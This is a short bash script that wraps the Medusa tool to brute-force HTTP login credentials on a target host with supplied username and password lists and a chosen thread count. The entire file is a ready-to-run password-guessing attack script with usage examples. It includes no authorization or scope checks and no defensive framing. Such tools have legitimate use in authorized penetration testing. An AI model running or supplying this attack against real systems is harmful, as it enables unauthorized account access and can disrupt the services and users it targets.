#!/bin/bash
# Medusa - Brute Force HTTP Login
# Options:
# -h : Target host
# -U : List of usernames
# -P : List of passwords
# -M : Module to use (http)
# -t : Number of parallel connections

# Usage: medusa_http.sh <target_ip> <username_list> <password_list> <threads>
# Example script
# medusa_http.sh 192.168.1.1 usernames.txt passwords.txt 4

# Check if medusa is installed
if ! command -v medusa &> /dev/null
then
    echo "medusa could not be found, please install it first."
    exit
fi

# Ensure parameters are provided
if [ "$#" -ne 4 ]; then
    echo "Usage: $0 <target_ip> <username_list> <password_list> <threads>"
    exit 1
fi

TARGET=$1
USERLIST=$2
PASSLIST=$3
THREADS=$4

echo "Starting HTTP brute force on $TARGET with $THREADS threads"

# Perform brute force attack
medusa -h $TARGET -U $USERLIST -P $PASSLIST -M http -t $THREADS

echo "HTTP brute force attack completed."
